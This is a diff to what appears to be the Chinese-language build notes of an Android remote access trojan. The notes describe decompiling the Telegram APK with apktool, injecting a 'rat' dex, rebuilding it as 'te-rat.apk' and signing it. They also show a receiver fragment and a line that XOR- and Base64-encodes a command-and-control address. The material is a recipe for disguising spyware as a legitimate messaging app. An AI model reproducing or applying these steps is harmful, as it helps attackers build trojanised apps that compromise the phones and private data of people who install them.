@@ -6,11 +6,11 @@
 #### 生成方式
 
 ### Telegram 编译打包
--gradlew makeJar  // 生成jar
--dx --dex --output ratdex.jar rat.jar // 转换jar
--java -jar apktool_2.4.1.jar d app-debug.apk // 反编译APK，得到smail
--java -jar apktool_2.4.1.jar b .\Telegram_v6.3.0_apkpure.com -o te-rat.apk
--jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keypass 123456 -storepass 123456 -keystore demo.keystore te-rat.apk demo.keystore
+## gradlew makeJar  // 生成jar
+## dx --dex --output ratdex.jar rat.jar // 转换jar
+## java -jar apktool_2.4.1.jar d app-debug.apk // 反编译APK，得到smail
+## java -jar apktool_2.4.1.jar b .\Telegram_v6.3.0_apkpure.com -o te-rat.apk
+## jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keypass 123456 -storepass 123456 -keystore demo.keystore te-rat.apk demo.keystore
 
 #### 指令返回
 ## 0          //success
@@ -55,3 +55,5 @@
 ##         <category android:name="android.intent.category.HOME" />
 ##     </intent-filter>
 ## </receiver>
+
+## 异或加密 Base64Util.encode(XorUtil.xor("192.168.3.86:8001")
